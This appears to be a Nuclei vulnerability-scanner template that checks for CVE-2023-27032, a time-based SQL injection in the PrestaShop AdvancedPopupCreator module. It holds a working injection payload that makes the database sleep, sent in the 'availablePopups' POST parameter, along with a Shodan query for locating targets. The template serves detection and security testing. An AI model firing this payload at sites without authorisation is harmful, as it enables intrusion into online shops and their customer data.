http:
- extractors:
  - group: 1
    internal: true
    name: time
    regex:
    - ',"time":([0-9]+),'
    type: regex
  - group: 1
    internal: true
    name: token
    regex:
    - ',"static_token":"([0-9a-z]+)",'
    type: regex
  matchers:
  - condition: and
    dsl:
    - duration_2>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, 'popups','hasError')
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout 20s

    POST /module/advancedpopupcreator/popup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    availablePopups=if(now()=sysdate()%2Csleep(6)%2C0)&event=1&fromController=product&getPopup=1&id_category=0&id_manufacturer=0&id_product=1&id_supplier=0&referrer=&responsiveWidth=1280&time={{time}}&token={{token}}

    '
id: CVE-2023-27032
info:
  author: MaStErChO
  classification:
    cpe: cpe:2.3:a:idnovate:popup_module_\(on_entering\,_exit_popup\,_add_product\)_and_newsletter:*:*:*:*:*:prestashop:*:*
    cve-id: CVE-2023-27032
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.88753
    epss-score: 0.01979
  description: "In the module \u201CAdvanced Popup Creator\u201D (advancedpopupcreator)\
    \ from Idnovate for PrestaShop, a guest can perform SQL injection in affected\
    \ versions.\n"
  metadata:
    framework: prestashop
    max-request: 2
    product: popup_module_\(on_entering\,_exit_popup\,_add_product\)_and_newsletter
    shodan-query: http.component:"prestashop"
    vendor: idnovate
    verified: true
  name: PrestaShop AdvancedPopupCreator - SQL Injection
  reference:
  - https://security.friendsofpresta.org/modules/2023/04/11/advancedpopupcreator.html
  - https://addons.prestashop.com/en/pop-up/23773-popup-on-entry-exit-popup-add-product-and-newsletter.html
  severity: critical
  tags: time-based-sqli,cve,cve2023,sqli,prestashop,advancedpopupcreator,idnovate
